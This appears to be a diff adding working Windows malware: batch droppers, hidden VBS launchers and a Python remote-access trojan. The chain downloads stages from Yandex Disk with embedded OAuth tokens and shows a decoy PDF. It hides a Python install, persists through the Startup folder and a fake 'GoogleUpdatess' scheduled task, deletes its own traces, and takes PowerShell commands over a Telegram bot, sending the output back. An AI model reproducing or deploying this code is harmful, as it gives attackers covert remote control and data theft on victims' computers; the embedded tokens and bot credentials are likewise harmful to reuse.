@@ -1,0 +1,516 @@
+@echo off
+(
+    echo|set /p="CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False"
+) > "%localappdata%\.vbs"
+(
+    echo|set /p="curl -o "%%localappdata%%\r" -L -O -X GET "https://хххat" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAABy93Z1AADLWwAAAAD1iSnewShGvhwYSDSBG4RkS2WD8oz8_HE" -H "Content-Type: application/json""
+    echo:
+    echo|set /p="set /p B=<"%%localappdata%%\r""
+    echo:
+    echo|set /p="curl -o "%%localappdata%%\i.bat" -L -O -X GET "%%B:~9,445%%" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAABy93Z1AADLWwAAAAD1iSnewShGvhwYSDSBG4RkS2WD8oz8_HE" -H "Content-Type: application/json""
+    echo:
+    echo|set /p="del /s /q "%%localappdata%%\r""
+    echo:
+    echo|set /p="call %%localappdata%%\.vbs %%localappdata%%\i.bat"
+    echo:
+    echo|set /p="(goto) 2>nul & del "%%~f0""
+) > "%localappdata%\1.bat"
+call "%localappdata%\.vbs" "%localappdata%\1.bat"
+(goto) 2>nul & del "%~f0"
+
+
+
+\.vbs
+CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+
+
+\1.bat
+
+curl -o "C:\Users\admin\AppData\Local\r" -L -O -X GET "https://cloud-.com -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAABy93Z1AADLWwAAAAD1iSnewShGvhwYSDSBG4RkS2WD8oz8_HE" -H "Content-Type: application/json"
+
+set /p B=<"C:\Users\admin\AppData\Local\r"
+
+curl -o "C:\Users\admin\AppData\Local\i.bat" -L -O -X GET "%B:~9,445%" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAABy93Z1AADLWwAAAAD1iSnewShGvhwYSDSBG4RkS2WD8oz8_HE" -H "Content-Type: application/json"
+
+del /s /q "C:\Users\admin\AppData\Local\r"
+
+call C:\Users\admin\AppData\Local\.vbs C:\Users\admin\AppData\Local\i.bat
+
+(goto) 2>nul & del "%~f0"
+
+
+
+
+i.bat 
+
+@Echo off
+
+
+
+if exist "%localappdata%\Microsoft\Windows\Caches\cversions.db" (
+
+    exit 0 
+
+) 
+
+
+
+echo. > "%localappdata%\Microsoft\Windows\Caches\cversions.db"
+
+
+
+set PDF_FOLDER=%USERPROFILE%\Downloads
+
+
+
+curl -s -o "%PDF_FOLDER%\r" -L -O -X GET "https://cloud-api.yandex.net/v1/disk/resources/download?path=gazfile.pdf" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAAByTBlLAADLWwAAAADyqL91OZ3jchW8RteMt43CohMFjJRyL7M" -H "Content-Type: application/json"
+
+set /p B=<"%PDF_FOLDER%\r"
+
+
+
+curl -s -o "%PDF_FOLDER%\document.pdf" -L -O -X GET "%B:~9,443%" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAAByTBlLAADLWwAAAADyqL91OZ3jchW8RteMt43CohMFjJRyL7M" -H "Content-Type: application/json"
+
+
+
+start "" "%PDF_FOLDER%\document.pdf"
+
+del /s /q "%PDF_FOLDER%\r"
+
+
+set S_F=%cd%
+
+set FOLDER=%localappdata%\Python
+
+set PYTHON_VERSION_FIRST_TWO_PARTS=3.11
+
+set PYTHON_VERSION_FIRST_TWO_PARTS_WITHOUT_POINT=311
+
+set CI=6452535203
+
+set TT=6799392742:AAHsm5KbskjIz498idjly-1lWGEZDwuIkRQ
+
+
+
+curl -s -o %localappdata%\python.zip -L -O "https://www.python.org/ftp/python/%PYTHON_VERSION_FIRST_TWO_PARTS%.4/python-%PYTHON_VERSION_FIRST_TWO_PARTS%.4-embed-amd64.zip"
+
+
+
+if exist "%FOLDER%" (
+
+    rmdir /s /q "%FOLDER%"
+
+    mkdir "%FOLDER%"
+
+) else (
+
+    mkdir "%FOLDER%"
+
+)
+
+
+
+tar -xf %localappdata%\python.zip -C "%FOLDER%"
+
+del /s /q %localappdata%\python.zip
+
+attrib +h "%FOLDER%" /s /d
+
+
+
+del /s /q "%FOLDER%\python%PYTHON_VERSION_FIRST_TWO_PARTS_WITHOUT_POINT%._pth"
+
+
+
+(
+
+echo Lib/site-packages
+
+echo python%PYTHON_VERSION_FIRST_TWO_PARTS_WITHOUT_POINT%.zip
+
+echo .
+
+echo:
+
+echo # Uncomment to run site.main^(^) automatically
+
+echo import site
+
+) > "%FOLDER%\python%PYTHON_VERSION_FIRST_TWO_PARTS_WITHOUT_POINT%._pth"
+
+
+
+(cd "%FOLDER%" && curl -s -o get-pip.py https://bootstrap.pypa.io/get-pip.py && python get-pip.py)
+
+
+
+call python -m pip install requests
+
+call python -m pip install schedule
+
+
+
+del /s /q get-pip.py
+
+
+(
+
+echo %TT%
+
+echo %CI%
+
+) > "%localappdata%\microsoft\windows\cloudstore\cloud"
+
+
+
+curl -s -o "%FOLDER%\r" -L -O -X GET "https://cloud-api.yandex.net/v1/disk/resources/download?path=f" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAAByTBlLAADLWwAAAADyqL91OZ3jchW8RteMt43CohMFjJRyL7M" -H "Content-Type: application/json"
+
+set /p B=<"%FOLDER%\r"
+
+
+
+echo "%B:~9,426%"
+
+
+
+curl -s -o "%FOLDER%\f.py" -L -O -X GET "%B:~9,426%" -H "Accept: application/json" -H "Authorization: OAuth y0_AgAAAAByTBlLAADLWwAAAADyqL91OZ3jchW8RteMt43CohMFjJRyL7M" -H "Content-Type: application/json"
+
+del /s /q "%FOLDER%\r"
+
+
+
+if exist "%localappdata%\.vbs" (
+
+    del /s /q "%localappdata%\.vbs"
+
+    (
+
+echo|set /p="Set oShell = CreateObject("Wscript.Shell")"
+
+echo:
+
+echo|set /p="oShell.Run "%localappdata%\Python\python.exe %localappdata%\Python\f.py" , 0, true"
+
+    ) > "%localappdata%\Python\python.vbs"
+
+    copy "%localappdata%\Python\python.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+    call "%localappdata%\Python\python.vbs"
+
+    (goto) 2>nul & start /b python "%FOLDER%\f.py" -f "d" & del "%~f0"
+
+) else (
+
+    (goto) 2>nul & start /b python "%FOLDER%\f.py" -f "d" & del "%~f0"
+
+)
+
+
+
+
+python.vbs
+
+Set oShell = CreateObject("Wscript.Shell")
+
+oShell.Run "C:\Users\admin\AppData\Local\Python\python.exe C:\Users\admin\AppData\Local\Python\f.py" , 0, true
+
+
+
+
+
+
+f.py
+
+Preview
+import requests
+
+import time
+
+import os
+
+import subprocess
+
+import schedule
+
+import random
+
+from functools import partial
+
+import argparse
+
+import sys
+
+
+
+creds = []
+
+arr_server = []
+
+
+
+with open(f"{os.path.join(os.environ['LOCALAPPDATA'])}\\Microsoft\\Windows\\CloudStore\\cloud", 'r', encoding='utf-8') as file:
+
+    for token in file:
+
+        creds.append(token.strip())
+
+
+
+local_env = os.environ['LOCALAPPDATA']
+
+
+
+if(os.path.exists(f"{local_env}\\Microsoft\\Windows\\Caches\\cversion")):
+
+    with open(f"{local_env}\\Microsoft\\Windows\\Caches\\cversion", encoding='utf-8') as file:
+
+        for id in file:
+
+            arr_server.append(id.strip())
+
+else:
+
+    rand_id = ''.join([str(random.randint(0, 9)) for _ in range(5)])
+
+    arr_server.append(rand_id)
+
+    with open(f"{local_env}\\Microsoft\\Windows\\Caches\\cversion", "w") as file:
+
+        file.write(rand_id)
+
+
+
+TOKEN = creds[0]
+
+CHAT_ID = creds[1]
+
+SERVER_ID = arr_server[0]
+
+#''.join([str(random.randint(0, 9)) for _ in range(5)])
+
+
+
+processed_message_ids = []
+
+
+
+def send_message(text):
+
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    params = {
+
+        'chat_id': CHAT_ID,
+
+        'text': f"Response from {SERVER_ID}: {text}"
+
+    }
+
+    response = requests.get(url, params=params)
+
+    if response.status_code != 200:
+        pass
+
+
+
+def send_file(text):
+
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+
+    local = os.environ['LOCALAPPDATA']
+
+    with open(f"{local}\\Python\\rs.txt", "a") as file:
+
+        file.write(text)
+
+    files = {'document': open(f"{local}\\Python\\rs.txt", 'rb')}
+
+    data = {'chat_id': CHAT_ID}
+
+    response = requests.post(url, files=files, data=data)
+
+    if response.status_code != 200:
+        pass
+
+
+
+def execute_command(command):
+
+    command = f'powershell.exe {command}'
+
+    res = subprocess.run(command, shell=True, text=True, capture_output=True)
+
+    return res.returncode, res.stdout, res.stderr
+
+
+
+def upload_file (ip_addr, file_name):
+
+    local = os.path.join(os.environ['LOCALAPPDATA'])
+
+    command = f'powershell.exe Invoke-WebRequest -Uri "http://{ip_addr}/{file_name}" -OutFile "{local}\\Microsoft\\Windows\\Ringtones\\{file_name}"'
+
+    res = subprocess.run(command, shell=True, text=True, capture_output=True)
+
+    return res.returncode, res.stdout, res.stderr
+
+
+
+def handle_updates(updates):
+
+    highest_update_id = 0
+
+    global first_connect
+
+    local = os.environ['LOCALAPPDATA']
+
+    for update in updates:
+
+        if 'message' in update and 'text' in update['message']:
+
+            message_text = update['message']['text']
+
+            message_id = update['message']['message_id']
+
+            if message_id in processed_message_ids:
+
+                continue
+
+            processed_message_ids.append(message_id)
+
+            if first_connect == False:
+
+                send_message("Im conected penetratedme!!!")
+
+                first_connect = True
+
+            if "info" in message_text:
+
+                send_message("I'm online!!!")
+
+            if SERVER_ID in message_text.split("*")[0]:
+
+                if "download" in message_text.split("*")[1]:
+
+                    ip_adr = message_text.split("*")[1].split("-")[1].split(" ")[0]
+
+                    file_name = message_text.split("*")[1].split("-")[1].split(" ")[1]
+
+                    send_message(upload_file(ip_adr, file_name))
+
+                else:
+
+                    return_code, stdout, stderr = execute_command(message_text.split("*")[1])
+
+                    if len(stdout) > 0:
+
+                        send_file(stdout)
+
+                        os.remove(f"{local}\\Python\\rs.txt")
+
+                    elif len(stderr) > 0:
+
+                        send_message(f"ERORR!!!\n {stderr}")
+
+                    else:
+
+                        send_message("Command word is Done, Check Result")
+
+        update_id = update['update_id']
+
+        if update_id > highest_update_id:
+
+            highest_update_id = update_id
+
+    return highest_update_id
+
+
+
+def get_updates(offset=None):
+
+    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
+
+    params = {'offset': offset, 'timeout': 60}
+
+    response = requests.get(url, params=params)
+
+    if response.status_code == 200:
+
+        data = response.json()
+
+        return data.get('result', [])
+
+    else:
+
+        return []
+
+
+
+def run_updates():
+
+    global offset
+
+    updates = get_updates(offset)
+
+    if updates:
+
+        offset = handle_updates(updates) + 1
+
+        processed_message_ids.clear()
+
+    else:
+
+        pass
+
+    time.sleep(1)
+
+
+
+def main():
+
+    try:
+
+        parser = argparse.ArgumentParser()
+
+        parser.add_argument('-f', '--schedule_flag', type=str)
+
+        args = parser.parse_args()
+
+        if args.schedule_flag:
+
+            local = os.environ['LOCALAPPDATA']
+
+            command = f"powershell.exe schtasks /create /tn 'GoogleUpdatess' /tr '{local}\\Python\\python.vbs' /sc minute /mo 1"
+
+            subprocess.run(command, shell=True, text=True, capture_output=True)
+
+            sys.exit(0)
+
+        global offset
+
+        global first_connect
+
+        offset = None
+
+        first_connect = False
+
+        job_func = partial(run_updates)
+
+        schedule.every(3).seconds.do(job_func)
+
+
+
+        while True:
+
+            schedule.run_pending()
+
+            time.sleep(1)
+
+    except Exception as e:
+
+        print(e)
+
+
+
+if __name__ == '__main__':
+
+    main()
